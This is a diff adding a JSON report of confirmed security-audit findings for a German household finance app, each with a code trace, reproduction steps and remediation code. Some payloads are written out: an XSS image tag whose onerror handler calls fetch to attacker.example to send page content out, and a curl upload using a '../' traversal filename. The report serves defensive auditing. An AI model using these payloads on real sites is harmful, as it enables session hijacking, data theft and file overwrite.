@@ -1,0 +1,305 @@
+[
+  {
+    "verdict": "confirmed",
+    "title": "Stored XSS via category names rendered unescaped in the overview hints widget",
+    "description": "Category names are stored without any character filtering, both from the Excel import (column headers become categories) and from POST/PATCH /api/kategorien. rechenbasis.hinweise() embeds the name of the category with the highest expenses into a hint text (condition: any expense in the period). static-neu/pages/uebersicht.js renders that hint text with innerHTML without esc(), the only unescaped sink in the file. No Content-Security-Policy header is set. Reproduced: importing an .xlsx with column header '<img src=x onerror=alert(1)>' in mode 'einspielen' creates that category verbatim; after one expense booking GET /api/uebersicht returns {\"art\":\"kategorie_anteil\",\"text\":\"<img src=x onerror=alert(1)>: 100% der Ausgaben.\"}; a Node harness of the sink confirms the onerror handler survives.",
+    "root_cause": "renderHints in static-neu/pages/uebersicht.js does not HTML-escape h.text before assigning it to innerHTML, allowing category names supplied via Excel import or the API to execute script in the owner's session.",
+    "intended_behavior": "Every user-controlled string in the new frontend is passed through esc() before being inserted into HTML, so imported or typed category names are displayed as text only.",
+    "trace": [
+      {"kind": "entrypoint", "file": "app/routers/import_excel.py", "line": 178, "scope": "import_excel", "description": "Spreadsheet column header is turned into a category name via _text(), which only strips whitespace."},
+      {"kind": "propagation", "file": "app/routers/import_excel.py", "line": 359, "scope": "import_excel", "description": "INSERT INTO kategorie(sparte_id, name, richtung) stores the raw name."},
+      {"kind": "propagation", "file": "app/rechenbasis.py", "line": 248, "scope": "hinweise", "description": "Hint text f\"{top['name']}: {share}% der Ausgaben.\" embeds the raw category name and is returned by GET /api/uebersicht."},
+      {"kind": "sink", "file": "static-neu/pages/uebersicht.js", "line": 172, "scope": "renderHints", "description": "el.innerHTML = hints.map(h => `...${h.text}...`) renders the text without esc()."}
+    ],
+    "conditions": [
+      {"kind": "authentication_level", "description": "The victim (the only user) must import the crafted spreadsheet or create the category; the import endpoint requires a session."},
+      {"kind": "data_state", "description": "At least one expense in the viewed period must belong to the malicious category so it becomes the top category of the 'kategorie_anteil' hint."}
+    ],
+    "execution": {
+      "attacker_perspective": "A third party who hands the household a Kassabuch spreadsheet (shared template, family member, accountant); the owner imports it into the new frontend.",
+      "payloads": [
+        "Excel column header: <img src=x onerror=\"fetch('https://attacker.example/?d='+encodeURIComponent(document.body.innerText))\">",
+        "POST /api/import/excel?bereich_id=1 (multipart: datei=<xlsx>, sparte_id=5, modus=einspielen)"
+      ],
+      "instructions": [
+        "Create an .xlsx in the Kassabuch layout with the payload as a category column header.",
+        "Owner imports it via POST /api/import/excel with modus=einspielen; the category is created verbatim.",
+        "Any expense booked on that category (or later via the payload column) makes it the top expense category.",
+        "Owner opens #/uebersicht; GET /api/uebersicht returns the hint text containing the payload; renderHints assigns it to innerHTML."
+      ],
+      "expected_result": "The onerror handler executes in the owner's authenticated session and can call any /api/* endpoint (export, delete, backup) or exfiltrate page content."
+    },
+    "remediation": {
+      "strategy": "Escape the hint text at the sink like every other field, restrict category names server-side to a safe character set on both creation paths, and add a Content-Security-Policy header as defense in depth.",
+      "code_changes": [
+        {"file_name": "static-neu/pages/uebersicht.js", "fixed_code": "el.innerHTML = hints.map((h, i) => `<div class=\"hint-row\">\n    <div>${esc(h.text)}</div>"},
+        {"file_name": "app/auth.py", "fixed_code": "response.headers[\"Content-Security-Policy\"] = \"default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'\""}
+      ]
+    },
+    "severity": {
+      "likelihood": {"score": "medium", "reason": "Requires the owner to import a crafted file or create the name, but importing third-party spreadsheets is the intended use of the feature; the hint fires with any expense."},
+      "impact": {"score": "high", "reason": "Arbitrary script in the authenticated session of the only user, no CSP; full API access and exfiltration."},
+      "overall_severity": "high"
+    },
+    "confidence": {"score": "high", "reason": "Every step reproduced: stored name, hint text from the real API function, sink code verified; independently confirmed by a second agent."}
+  },
+  {
+    "verdict": "confirmed",
+    "title": "Race condition in refunds allows refunding more than the original amount",
+    "description": "erstatten_buchung computes the already refunded sum and checks the remaining amount outside any transaction; only the later call to erstelle_buchung opens BEGIN IMMEDIATE, and no check is repeated inside it. No database constraint enforces 'sum of refunds <= original'. Reproduced on a throwaway instance: one expense of 100 EUR, eight parallel POST /api/buchungen/{id}/erstatten with 100 EUR each returned 201 six times; the booking then reported netto_cent = -50000 with six refund bookings.",
+    "root_cause": "erstatten_buchung in app/routers/buchungen.py does not perform the remaining-amount check inside the write transaction, allowing concurrent requests to each pass the check and insert refunds exceeding the original amount.",
+    "intended_behavior": "The sum of all refunds for a booking line never exceeds the line's amount (rule documented in migration 017); a second refund beyond the remainder is rejected with 422.",
+    "trace": [
+      {"kind": "entrypoint", "file": "app/routers/buchungen.py", "line": 666, "scope": "erstatten_buchung", "description": "POST /api/buchungen/{buchung_id}/erstatten receives zeilen with original_zeile_id and betrag_cent."},
+      {"kind": "propagation", "file": "app/routers/buchungen.py", "line": 719, "scope": "erstatten_buchung", "description": "SELECT COALESCE(SUM(...)) of existing refunds and the rest check run on an autocommit connection without a lock."},
+      {"kind": "sink", "file": "app/routers/buchungen.py", "line": 108, "scope": "erstelle_buchung", "description": "BEGIN IMMEDIATE is opened only here and the refund booking is inserted without re-validating the remainder."}
+    ],
+    "conditions": [
+      {"kind": "authentication_level", "description": "Valid session of the owner; triggered by double submission, two devices or a retrying client."},
+      {"kind": "timing_dependency", "description": "Two or more refund requests must overlap before the first commit."}
+    ],
+    "execution": {
+      "attacker_perspective": "The authenticated user (or a script running in their session, e.g. via F1) sending overlapping refund requests.",
+      "payloads": [
+        "POST /api/buchungen/{id}/erstatten?bereich_id=1 {\"datum\":\"2026-01-13\",\"zeilen\":[{\"original_zeile_id\":Z,\"betrag_cent\":10000}]}"
+      ],
+      "instructions": [
+        "Create an expense booking of 100 EUR and note its line id Z.",
+        "Send eight concurrent refund requests for 100 EUR against Z (ThreadPoolExecutor or two devices).",
+        "Read GET /api/buchungen/{id}."
+      ],
+      "expected_result": "Several requests return 201; netto_cent becomes negative (observed -50000) and multiple refund bookings exist."
+    },
+    "remediation": {
+      "strategy": "Re-run the remaining-amount check inside the nach_anlage hook, which erstelle_buchung executes within its own BEGIN IMMEDIATE transaction (do NOT open a second BEGIN IMMEDIATE in erstatten_buchung: erstelle_buchung already does, and nested transactions raise 'cannot start a transaction within a transaction'). Raising HTTPException inside the hook rolls the whole booking back. Optionally add a trigger enforcing the sum.",
+      "code_changes": [
+        {"file_name": "app/routers/buchungen.py", "fixed_code": "def nach_anlage(con_, buchung_id_):\n    # laeuft innerhalb der BEGIN-IMMEDIATE-Transaktion von erstelle_buchung\n    for z in body.zeilen:\n        bereits = con_.execute(\"SELECT COALESCE(SUM(bz.betrag_cent),0) FROM buchungszeile bz JOIN buchung b ON b.id=bz.buchung_id WHERE bz.original_zeile_id=? AND b.storniert_am IS NULL AND b.id<>?\", (z.original_zeile_id, buchung_id_)).fetchone()[0]\n        if bereits + z.betrag_cent > original_zeilen[z.original_zeile_id]['betrag_cent']:\n            raise HTTPException(422, 'Erstattung uebersteigt den Restbetrag')\n    ... bestehende Verknuepfung original_id/original_zeile_id ..."}
+      ]
+    },
+    "severity": {
+      "likelihood": {"score": "medium", "reason": "Needs overlapping requests; double click, two devices or network retries make this realistic in normal use."},
+      "impact": {"score": "high", "reason": "Explicit financial invariant broken; sums, reports and exports become permanently wrong."},
+      "overall_severity": "high"
+    },
+    "confidence": {"score": "high", "reason": "Reproduced live by the hunter (6 of 8 succeeded) and confirmed at code level by a second agent; no DB constraint found."}
+  },
+  {
+    "verdict": "confirmed",
+    "title": "Race condition when adopting a receipt evaluation books the same receipt multiple times",
+    "description": "auswertung_uebernehmen checks status == 'fertig' before the transaction and the nach_anlage hook sets status='verbucht' unconditionally; buchung_beleg allows several bookings per receipt. Reproduced: eight parallel POST /api/beleg-auswertungen/{id}/uebernehmen with fresh client_request_id each returned 201 five times, creating five 50 EUR bookings from one receipt. The frontend disables the button and generates a new client_request_id per click, which stops a plain double click but not scripts or two devices.",
+    "root_cause": "auswertung_uebernehmen in app/routers/beleg_auswertung.py does not reserve the auftrag status atomically inside the write transaction, allowing concurrent requests to each read 'fertig' and create separate bookings.",
+    "intended_behavior": "One finished evaluation results in exactly one booking; a second adoption attempt is rejected with 409 or returns the cached first answer.",
+    "trace": [
+      {"kind": "entrypoint", "file": "app/routers/beleg_auswertung.py", "line": 186, "scope": "auswertung_uebernehmen", "description": "POST /api/beleg-auswertungen/{auswertung_id}/uebernehmen with positions and optional client_request_id."},
+      {"kind": "propagation", "file": "app/routers/beleg_auswertung.py", "line": 214, "scope": "auswertung_uebernehmen", "description": "status != 'fertig' -> 409 is evaluated outside any transaction."},
+      {"kind": "sink", "file": "app/routers/beleg_auswertung.py", "line": 257, "scope": "beleg_verknuepfen_und_abschliessen", "description": "UPDATE beleg_auswertung SET status='verbucht' runs unconditionally inside erstelle_buchung's transaction after a new booking was inserted."}
+    ],
+    "conditions": [
+      {"kind": "authentication_level", "description": "Valid session of the owner."},
+      {"kind": "timing_dependency", "description": "Requests must overlap; each with a distinct or absent client_request_id."}
+    ],
+    "execution": {
+      "attacker_perspective": "The authenticated user via script or two devices (or script injected through F1).",
+      "payloads": [
+        "POST /api/beleg-auswertungen/1/uebernehmen?bereich_id=1 {\"sparte_id\":1,\"datum\":\"2026-09-01\",\"zahlungsart\":\"bar\",\"positionen\":[{\"kategorie_id\":42,\"betrag_cent\":5000,\"typ\":\"ausgabe\",\"text\":\"x\"}],\"client_request_id\":\"<new uuid>\"}"
+      ],
+      "instructions": [
+        "Upload a receipt and request its evaluation; wait until status is 'fertig'.",
+        "Send eight concurrent adoption requests with different client_request_id values.",
+        "List bookings linked to the receipt."
+      ],
+      "expected_result": "Several requests return 201 with distinct buchung_id values; the receipt amount is booked multiple times (observed 5x)."
+    },
+    "remediation": {
+      "strategy": "Reserve the status atomically: inside the transaction execute UPDATE beleg_auswertung SET status='verbucht' WHERE id=? AND status='fertig' and abort with 409 when rowcount is 0, before creating the booking.",
+      "code_changes": [
+        {"file_name": "app/routers/beleg_auswertung.py", "fixed_code": "def beleg_verknuepfen_und_abschliessen(con_, buchung_id_):\n    cur = con_.execute(\"UPDATE beleg_auswertung SET status='verbucht', aktualisiert=datetime('now') WHERE id=? AND status='fertig'\", (auswertung_id,))\n    if cur.rowcount != 1:\n        raise HTTPException(409, 'Auswertung wurde bereits uebernommen')\n    ..."}
+      ]
+    },
+    "severity": {
+      "likelihood": {"score": "medium", "reason": "Frontend blocks a simple double click; scripts, retries or two devices still trigger it."},
+      "impact": {"score": "high", "reason": "Duplicate bookings of real expenses corrupt cash and category totals permanently."},
+      "overall_severity": "high"
+    },
+    "confidence": {"score": "high", "reason": "Reproduced live (5 of 8) and confirmed at code level by an independent agent; schema allows multiple bookings per receipt."}
+  },
+  {
+    "verdict": "confirmed",
+    "title": "Backup rotation deletes the entire receipt store because reference keys never match",
+    "description": "_bereinige_store collects referenced files from manifests as tuples (sha256, original filename) but compares store files as (sha256, suffix); the tuples can never be equal, so every file in backup/belege-store is unlinked on each rotation. Rotation runs whenever more than BACKUP_AUFBEWAHREN daily copies exist and is also triggered immediately by POST /api/betrieb/sicherung; it is applied to the second target as well. Reproduced with a harness: after rotation the store was empty and pruefe_sicherung(today) reported belege_fehlend: 2, manifest_ok: False. The tests in tests/test_backup.py never execute the comparison (too few copies or an empty store). The bug exists only on branch neubau (commit 153fc1b), not in the production branch studio.",
+    "root_cause": "_bereinige_store in app/backup.py does not build the reference set with the same key as the store file names (sha256 plus suffix), allowing the rotation to delete every stored receipt copy including referenced ones.",
+    "intended_behavior": "Rotation removes only store files that are no longer referenced by any retained manifest, so receipts of all kept daily backups remain restorable.",
+    "trace": [
+      {"kind": "entrypoint", "file": "app/routers/betrieb.py", "line": 134, "scope": "sicherung_starten", "description": "POST /api/betrieb/sicherung runs backup.sichere_datenbank (the lifespan loop runs the same function daily)."},
+      {"kind": "propagation", "file": "app/backup.py", "line": 218, "scope": "_abschliessen", "description": "After the daily copy _rotiere(ziel_ordner) is called."},
+      {"kind": "propagation", "file": "app/backup.py", "line": 429, "scope": "_rotiere", "description": "With more than BACKUP_AUFBEWAHREN daily copies old sets are removed and _bereinige_store is invoked."},
+      {"kind": "propagation", "file": "app/backup.py", "line": 449, "scope": "_bereinige_store", "description": "referenzen.update((eintrag['sha256'], eintrag['dateiname'])) stores the original filename as second element."},
+      {"kind": "sink", "file": "app/backup.py", "line": 459, "scope": "_bereinige_store", "description": "(pfad.stem, pfad.name[len(pfad.stem):]) is (sha256, suffix) and is never in referenzen, so pfad.unlink() deletes every store file."}
+    ],
+    "conditions": [
+      {"kind": "data_state", "description": "More than BACKUP_AUFBEWAHREN (30) daily copies exist, i.e. from day 31 of operation, or the manual trigger is used after that point."},
+      {"kind": "authentication_level", "description": "For the sabotage variant a valid session is needed to delete a receipt and call POST /api/betrieb/sicherung; the natural loss needs no attacker."}
+    ],
+    "execution": {
+      "attacker_perspective": "No attacker required (silent data loss); or an authenticated user/script wanting to destroy receipt backups irreversibly.",
+      "payloads": [
+        "DELETE /api/belege/{id}?bereich_id=1",
+        "POST /api/betrieb/sicherung?bereich_id=1"
+      ],
+      "instructions": [
+        "Operate the app until 31 daily backups exist (or simulate them).",
+        "Delete a receipt via DELETE /api/belege/{id}.",
+        "Trigger POST /api/betrieb/sicherung (or wait for the daily run).",
+        "Inspect backup/belege-store and run backup.pruefe_sicherung(<old day>)."
+      ],
+      "expected_result": "The store is empty; old daily sets report all receipts missing and manifest_ok False; the second target is affected the same way."
+    },
+    "remediation": {
+      "strategy": "Build the reference set from resolved store paths using _store_pfad and compare resolved paths; add a test with more than 30 daily copies and a populated store.",
+      "code_changes": [
+        {"file_name": "app/backup.py", "fixed_code": "referenzen.add(_store_pfad(ordner, eintrag['sha256'], eintrag['dateiname']).resolve())\n...\nif pfad.is_file() and pfad.resolve() not in referenzen:\n    pfad.unlink()"}
+      ]
+    },
+    "severity": {
+      "likelihood": {"score": "high", "reason": "Deterministic on every rotation from day 31; also triggerable at will through the manual backup endpoint."},
+      "impact": {"score": "high", "reason": "All receipt copies in all retained backups and on the NAS second target are lost irreversibly; the receipt part of the backup is void."},
+      "overall_severity": "high"
+    },
+    "confidence": {"score": "high", "reason": "Reproduced twice independently with harnesses; test blindness demonstrated by instrumentation; git history checked."}
+  },
+  {
+    "verdict": "confirmed",
+    "title": "Path traversal in receipt upload via the client filename (Windows only)",
+    "description": "upload_beleg builds the target path as f\"{beleg_id}_{original}\" with the raw client filename. python-multipart strips only drive-letter/UNC prefixes. On Windows the Win32 path normalisation is lexical, so filename=../../../../evil.png with prefix '1_' resolves two levels above the receipt directory; reproduced on a throwaway instance (file written to %TEMP%\\audit-val-d\\evil.png, HTTP 201). On Linux (production CT 101) open(2) fails with ENOENT because the component '1_..' does not exist and no subdirectories exist below belege/<sparte>/, so production is not affected. The extension whitelist limits targets to image/PDF extensions.",
+    "root_cause": "upload_beleg in app/routers/belege.py does not reduce datei.filename to its base name nor verify the resolved target stays inside the receipt directory, allowing '..' segments to escape the directory on Windows.",
+    "intended_behavior": "Uploaded receipts are always written as a file directly inside belege/<sparte_id>/ regardless of the client-supplied name.",
+    "trace": [
+      {"kind": "entrypoint", "file": "app/routers/belege.py", "line": 96, "scope": "upload_beleg", "description": "original = datei.filename or 'unbenannt' takes the multipart filename unchanged."},
+      {"kind": "propagation", "file": "app/routers/belege.py", "line": 131, "scope": "upload_beleg", "description": "ziel = _belege_verzeichnis(sparte_id) / f\"{beleg_id}_{original}\" keeps '..' segments after the id prefix."},
+      {"kind": "sink", "file": "app/routers/belege.py", "line": 132, "scope": "upload_beleg", "description": "ziel.write_bytes(inhalt) writes to the lexically normalised path outside the directory on Windows."}
+    ],
+    "conditions": [
+      {"kind": "system_configuration", "description": "Windows host (development setup via start.cmd / scripts/setup.ps1); Linux resolves path components strictly and is not affected."},
+      {"kind": "authentication_level", "description": "Valid session (or script in the owner's session)."}
+    ],
+    "execution": {
+      "attacker_perspective": "Authenticated user or injected script on a Windows-hosted instance.",
+      "payloads": [
+        "curl -F \"datei=@x.png;filename=../../../../evil.png\" \"http://127.0.0.1:8000/api/belege?bereich_id=1\""
+      ],
+      "instructions": [
+        "Send the multipart upload with a traversal filename and an allowed extension.",
+        "Observe the returned pfad and check the filesystem two levels above the receipt directory."
+      ],
+      "expected_result": "HTTP 201 and the file exists outside belege/<sparte>/; existing files with an allowed extension at that path are overwritten."
+    },
+    "remediation": {
+      "strategy": "Use only the base name and verify containment after resolving, following the pattern already used in app/backup.py; handle OSError explicitly.",
+      "code_changes": [
+        {"file_name": "app/routers/belege.py", "fixed_code": "original = pathlib.Path(datei.filename or 'unbenannt').name\n...\nbasis = _belege_verzeichnis(sparte_id).resolve()\nziel = basis / f\"{beleg_id}_{original}\"\nziel.resolve().relative_to(basis)  # ValueError -> 400"}
+      ]
+    },
+    "severity": {
+      "likelihood": {"score": "low", "reason": "Only on Windows hosts, which are the development path; production runs on Linux."},
+      "impact": {"score": "medium", "reason": "Overwrite of arbitrary files with image/PDF extensions relative to the receipt directory, including other receipts and store files."},
+      "overall_severity": "medium"
+    },
+    "confidence": {"score": "high", "reason": "Reproduced live on Windows by two agents; Linux behaviour argued from POSIX semantics and directory layout, not tested on Linux."}
+  },
+  {
+    "verdict": "confirmed",
+    "title": "Write-protection middleware runs before device filter and authentication and discloses migration errors",
+    "description": "schreibschutz_middleware is registered with @app.middleware('http') after add_middleware(AuthMiddleware) and TrustedHostMiddleware; Starlette builds the stack in reverse, so it becomes the outermost middleware. When the app is in write-protected state after a failed migration, any peer that reaches the port (not on the client allowlist, no session) gets 503 with the full MigrationsFehler text (migration number, SQLite error, possibly paths) and without the security headers set by AuthMiddleware. Reproduced with app.state.schreibgeschuetzt=True and a client IP outside FINANZ_ALLOWED_CLIENT_IPS: POST /api/buchungen -> 503 with details, GET /api/health -> 403.",
+    "root_cause": "schreibschutz_middleware in app/main.py is registered as the outermost middleware and does not require the client and session checks to run first, allowing unauthenticated peers to read migration failure details.",
+    "intended_behavior": "Unknown devices receive 403 before any application logic (as documented in docs/SICHERHEIT.md); write protection is enforced only for authenticated callers.",
+    "trace": [
+      {"kind": "entrypoint", "file": "app/main.py", "line": 98, "scope": "schreibschutz_middleware", "description": "@app.middleware('http') registers the write-protection check last, making it the outermost layer."},
+      {"kind": "propagation", "file": "app/main.py", "line": 67, "scope": "module", "description": "AuthMiddleware (client allowlist and session) is added earlier and therefore sits inside; it never runs for the 503 path."},
+      {"kind": "sink", "file": "app/main.py", "line": 107, "scope": "schreibschutz_middleware", "description": "JSONResponse {'detail': f'Datenbank-Nachzug fehlgeschlagen: {fehler}'} returns the raw migration error to the caller."}
+    ],
+    "conditions": [
+      {"kind": "data_state", "description": "The app must be in write-protected state (a migration failed at startup)."},
+      {"kind": "network_routing", "description": "The peer must reach the service port (any Tailnet device via Tailscale Serve, or a local process)."}
+    ],
+    "execution": {
+      "attacker_perspective": "A Tailnet device that is not on the allowlist and has no session.",
+      "payloads": ["POST /api/buchungen with an empty body"],
+      "instructions": ["While the instance is write-protected, send any POST/PUT/PATCH/DELETE outside /api/auth/."],
+      "expected_result": "HTTP 503 with the migration error text and no Cache-Control/X-Frame-Options headers, instead of 403."
+    },
+    "remediation": {
+      "strategy": "Register the write-protection check as the innermost middleware (first add_middleware) or move it into a router dependency, and return a generic 503 body; expose details only via authenticated status endpoints.",
+      "code_changes": [
+        {"file_name": "app/main.py", "fixed_code": "app.add_middleware(BaseHTTPMiddleware, dispatch=schreibschutz_middleware)  # BEFORE add_middleware(AuthMiddleware)\n... JSONResponse({'detail': 'Datenbank derzeit schreibgeschuetzt'}, status_code=503)"}
+      ]
+    },
+    "severity": {
+      "likelihood": {"score": "low", "reason": "Only in the degraded state after a failed migration."},
+      "impact": {"score": "low", "reason": "Disclosure of migration diagnostics and an instance-state oracle; no data access."},
+      "overall_severity": "low"
+    },
+    "confidence": {"score": "high", "reason": "Middleware order printed from the real stack and behaviour reproduced by two agents."}
+  },
+  {
+    "verdict": "confirmed",
+    "title": "No size limit for uploads and imports; whole bodies are read into memory",
+    "description": "POST /api/belege, /api/import/csv and /api/import/excel call datei.file.read() without any limit; no Content-Length check, no ASGI/uvicorn body limit, no MemoryMax documented for the service. Starlette spools the raw stream to disk above 1 MB, but the handlers copy the full content into a bytes object. Only the authenticated user can trigger it; the container shares RAM with Ollama, so a multi-GB upload can exhaust the LXC, and receipts are stored permanently on disk.",
+    "root_cause": "upload_beleg in app/routers/belege.py does not enforce a maximum size before reading the upload, allowing an authenticated client to exhaust memory and disk of the container.",
+    "intended_behavior": "Uploads are capped at a sensible size (tens of MB) and rejected with 413 before being read.",
+    "trace": [
+      {"kind": "entrypoint", "file": "app/routers/belege.py", "line": 89, "scope": "upload_beleg", "description": "POST /api/belege accepts an UploadFile of any size."},
+      {"kind": "sink", "file": "app/routers/belege.py", "line": 106, "scope": "upload_beleg", "description": "inhalt = datei.file.read() loads the entire file into memory and later writes it to disk."}
+    ],
+    "conditions": [
+      {"kind": "authentication_level", "description": "Valid session of the owner (self-inflicted or via injected script)."}
+    ],
+    "execution": {
+      "attacker_perspective": "Authenticated user or script in their session.",
+      "payloads": ["curl -F \"datei=@huge.pdf\" \"http://127.0.0.1:8000/api/belege?bereich_id=1\" (several GB)"],
+      "instructions": ["Upload very large files repeatedly."],
+      "expected_result": "Memory pressure up to OOM in the container and permanent disk consumption under belege/."
+    },
+    "remediation": {
+      "strategy": "Check Content-Length and read in chunks with a hard cap (e.g. 25 MB), returning 413; apply the same to CSV and Excel imports.",
+      "code_changes": [
+        {"file_name": "app/routers/belege.py", "fixed_code": "MAX_UPLOAD = 25 * 1024 * 1024\ninhalt = datei.file.read(MAX_UPLOAD + 1)\nif len(inhalt) > MAX_UPLOAD:\n    raise HTTPException(413, 'Datei zu gross (max. 25 MB)')"}
+      ]
+    },
+    "severity": {
+      "likelihood": {"score": "low", "reason": "Only the single legitimate user can trigger it."},
+      "impact": {"score": "medium", "reason": "Availability of the whole container including Ollama; disk exhaustion breaks backups."},
+      "overall_severity": "low"
+    },
+    "confidence": {"score": "high", "reason": "Code paths and absence of limits verified; Starlette spooling behaviour checked in installed source."}
+  },
+  {
+    "verdict": "confirmed",
+    "title": "GET /api/betrieb/migrationsprotokoll returns entries of all Bereiche regardless of bereich_id",
+    "description": "The endpoint validates bereich_id through BereichDep but the SQL has no filter; the table has no bereich column. Entries contain object keys like 'buchung:<id>' or 'umbuchungsgruppe:<uuid>' and generic migration hints, no amounts or texts. No frontend calls the endpoint. This is a minor violation of the rule that Verein data must not be visible in the Haupt context: existence and count of unresolved migration cases of the other Bereich are exposed.",
+    "root_cause": "migrationsprotokoll in app/routers/betrieb.py does not restrict rows to the requested Bereich, allowing an authenticated caller in one Bereich to see migration entries referencing bookings of the other.",
+    "intended_behavior": "Every data endpoint returns only rows belonging to the requested Bereich.",
+    "trace": [
+      {"kind": "entrypoint", "file": "app/routers/betrieb.py", "line": 25, "scope": "migrationsprotokoll", "description": "GET /api/betrieb/migrationsprotokoll resolves bereich but ignores it."},
+      {"kind": "sink", "file": "app/routers/betrieb.py", "line": 28, "scope": "migrationsprotokoll", "description": "SELECT ... FROM migrationsprotokoll ORDER BY zeitpunkt, id returns all rows."}
+    ],
+    "conditions": [
+      {"kind": "authentication_level", "description": "Valid session."}
+    ],
+    "execution": {
+      "attacker_perspective": "The authenticated user querying the API directly.",
+      "payloads": ["GET /api/betrieb/migrationsprotokoll?bereich_id=2"],
+      "instructions": ["Call the endpoint with either bereich_id and compare."],
+      "expected_result": "Identical global list including buchung ids from the other Bereich."
+    },
+    "remediation": {
+      "strategy": "Remove the unused endpoint or filter via JOIN buchung -> sparte -> bereich_id on the objektkennung.",
+      "code_changes": []
+    },
+    "severity": {
+      "likelihood": {"score": "high", "reason": "Trivially callable by the only user."},
+      "impact": {"score": "informational", "reason": "Only internal ids and generic hints; no financial content."},
+      "overall_severity": "low"
+    },
+    "confidence": {"score": "high", "reason": "Code and table contents verified across migrations 004, 012, 015."}
+  }
+]
